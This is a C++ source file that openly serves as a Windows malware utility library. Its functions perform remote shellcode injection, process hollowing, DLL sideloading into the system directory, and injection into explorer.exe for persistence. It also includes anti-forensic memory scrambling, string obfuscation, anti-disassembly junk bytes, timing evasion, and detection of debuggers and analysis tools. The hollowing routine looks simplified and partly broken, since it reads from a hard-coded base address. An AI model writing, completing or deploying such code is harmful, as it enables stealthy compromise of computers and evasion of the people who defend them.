// utils.cpp - Shellcode injection, process hollowing, DLL sideloading, memory manipulation
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <vector>
#include <tlhelp32.h>
#include <psapi.h>

#pragma comment(lib, "psapi.lib")

// ---------- SHELLCODE EXECUTION (Remote Thread Injection) ----------
BOOL InjectShellcodeRemote(DWORD pid, const unsigned char* shellcode, DWORD shellcodeLen) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return FALSE;
    
    // Allocate memory in target process
    LPVOID remoteAddr = VirtualAllocEx(hProcess, NULL, shellcodeLen, 
                                       MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteAddr) {
        CloseHandle(hProcess);
        return FALSE;
    }
    
    // Write shellcode
    SIZE_T bytesWritten;
    if (!WriteProcessMemory(hProcess, remoteAddr, shellcode, shellcodeLen, &bytesWritten)) {
        VirtualFreeEx(hProcess, remoteAddr, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    
    // Create remote thread
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, 
                                        (LPTHREAD_START_ROUTINE)remoteAddr, 
                                        NULL, 0, NULL);
    if (!hThread) {
        VirtualFreeEx(hProcess, remoteAddr, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, remoteAddr, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    
    return TRUE;
}

// ---------- PROCESS HOLLOWING (Replace process memory with payload) ----------
BOOL HollowProcess(LPCSTR targetPath, const unsigned char* payload, DWORD payloadLen) {
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(STARTUPINFOA);
    
    // Create suspended process
    if (!CreateProcessA(targetPath, NULL, NULL, NULL, FALSE, 
                        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        return FALSE;
    }
    
    // Get process context
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, &ctx)) {
        TerminateProcess(pi.hProcess, 0);
        return FALSE;
    }
    
    // Read target process PE header to get entry point
    char peHeader[4096];
    SIZE_T bytesRead;
    if (!ReadProcessMemory(pi.hProcess, (LPCVOID)0x140000000, peHeader, sizeof(peHeader), &bytesRead)) {
        TerminateProcess(pi.hProcess, 0);
        return FALSE;
    }
    
    // Parse PE (simplified - full implementation would parse IMAGE_DOS_HEADER, IMAGE_NT_HEADERS)
    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)peHeader;
    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(peHeader + dosHeader->e_lfanew);
    
    // Allocate memory in target for payload
    LPVOID remoteAddr = VirtualAllocEx(pi.hProcess, NULL, payloadLen, 
                                       MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteAddr) {
        TerminateProcess(pi.hProcess, 0);
        return FALSE;
    }
    
    // Write payload
    if (!WriteProcessMemory(pi.hProcess, remoteAddr, payload, payloadLen, &bytesRead)) {
        VirtualFreeEx(pi.hProcess, remoteAddr, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0);
        return FALSE;
    }
    
    // Update entry point
    ctx.Rcx = (DWORD_PTR)remoteAddr;  // x64 calling convention
    SetThreadContext(pi.hThread, &ctx);
    
    ResumeThread(pi.hThread);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    
    return TRUE;
}

// ---------- DLL SIDELOADING (Hijack via Search Order) ----------
BOOL SideloadDLL(const char* legitimateExe, const char* maliciousDll) {
    char systemDir[MAX_PATH];
    GetSystemDirectoryA(systemDir, MAX_PATH);
    
    char dllPath[MAX_PATH];
    sprintf_s(dllPath, sizeof(dllPath), "%s\\%s", systemDir, maliciousDll);
    
    // Copy malicious DLL to system directory
    CopyFileA(maliciousDll, dllPath, FALSE);
    
    // Execute legitimate EXE that loads the DLL
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(STARTUPINFOA);
    
    return CreateProcessA(legitimateExe, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

// ---------- MEMORY SCRAMBLING (Anti-Forensics) ----------
void ScrambleMemory(void* addr, size_t size, DWORD seed) {
    unsigned char* p = (unsigned char*)addr;
    for (size_t i = 0; i < size; i++) {
        p[i] ^= (seed + i) & 0xFF;
    }
}

// ---------- STRING OBFUSCATION (XOR at runtime) ----------
char* DeobfuscateString(const char* obfuscated, size_t len, BYTE key) {
    char* result = (char*)malloc(len + 1);
    if (!result) return NULL;
    
    for (size_t i = 0; i < len; i++) {
        result[i] = obfuscated[i] ^ key;
    }
    result[len] = 0;
    return result;
}

// ---------- PROCESS LIST ENUMERATION ----------
std::vector<DWORD> FindProcessesByName(const char* processName) {
    std::vector<DWORD> pids;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return pids;
    
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);
    
    if (Process32First(hSnapshot, &pe)) {
        do {
            if (strcmp(pe.szExeFile, processName) == 0) {
                pids.push_back(pe.th32ProcessID);
            }
        } while (Process32Next(hSnapshot, &pe));
    }
    
    CloseHandle(hSnapshot);
    return pids;
}

// ---------- INJECT INTO EXPLORER (Common Persistence) ----------
BOOL InjectIntoExplorer(const unsigned char* payload, DWORD payloadLen) {
    std::vector<DWORD> explorerPids = FindProcessesByName("explorer.exe");
    if (explorerPids.empty()) return FALSE;
    
    for (DWORD pid : explorerPids) {
        if (InjectShellcodeRemote(pid, payload, payloadLen)) {
            return TRUE;
        }
    }
    return FALSE;
}

// ---------- JUNK CODE INSERTION (Anti-Disassembly) ----------
__declspec(naked) void JunkCode() {
    __asm {
        // 20 random bytes that don't affect execution
        _emit 0x90
        _emit 0xE8
        _emit 0x00
        _emit 0x00
        _emit 0x00
        _emit 0x00
        _emit 0x75
        _emit 0x01
        _emit 0xEB
        _emit 0x00
        _emit 0x66
        _emit 0x8B
        _emit 0xC0
        _emit 0x90
        _emit 0x90
        _emit 0xCC
        _emit 0xCC
        _emit 0xCC
        _emit 0xCC
        _emit 0xCC
        ret
    }
}

// ---------- SLEEP WITH JITTER ----------
void SleepWithJitter(int baseMs, int jitterMs) {
    if (jitterMs > 0) {
        int jitter = (rand() % (jitterMs * 2)) - jitterMs;
        baseMs += jitter;
        if (baseMs < 100) baseMs = 100;
    }
    Sleep(baseMs);
}

// ---------- RANDOM DELAY (Network Timing Evasion) ----------
void RandomDelay() {
    static bool seeded = false;
    if (!seeded) {
        srand((unsigned)time(NULL));
        seeded = true;
    }
    int delay = 1000 + (rand() % 3000);
    Sleep(delay);
}

// ---------- CHECK DEBUGGER PRESENCE (Advanced) ----------
BOOL IsDebugged() {
    // Check BeingDebugged flag
    if (IsDebuggerPresent()) return TRUE;
    
    // Check NtGlobalFlag
    // (PEB offset for NtGlobalFlag is 0x68 on x64)
    char* peb = (char*)__readgsqword(0x60);
    DWORD ntGlobalFlag = *(DWORD*)(peb + 0x68);
    if (ntGlobalFlag & 0x70) return TRUE;
    
    // Check for debugger processes
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(hSnapshot, &pe)) {
        do {
            const char* debuggers[] = {"ollydbg.exe", "x64dbg.exe", "windbg.exe", 
                                       "ida.exe", "immunitydebugger.exe", "procdump.exe"};
            for (int i = 0; i < 6; i++) {
                if (strstr(pe.szExeFile, debuggers[i])) {
                    CloseHandle(hSnapshot);
                    return TRUE;
                }
            }
        } while (Process32Next(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);
    
    return FALSE;
}

// ---------- EXPORTED FUNCTIONS ----------
extern "C" {
    BOOL ExecuteShellcode(const unsigned char* sc, DWORD len) {
        // Allocate and execute shellcode locally
        LPVOID mem = VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!mem) return FALSE;
        memcpy(mem, sc, len);
        ((void(*)())mem)();
        return TRUE;
    }
    
    DWORD GetParentPID() {
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        PROCESSENTRY32 pe;
        pe.dwSize = sizeof(PROCESSENTRY32);
        DWORD parentPid = 0;
        DWORD currentPid = GetCurrentProcessId();
        
        if (Process32First(hSnapshot, &pe)) {
            do {
                if (pe.th32ProcessID == currentPid) {
                    parentPid = pe.th32ParentProcessID;
                    break;
                }
            } while (Process32Next(hSnapshot, &pe));
        }
        CloseHandle(hSnapshot);
        return parentPid;
    }
}
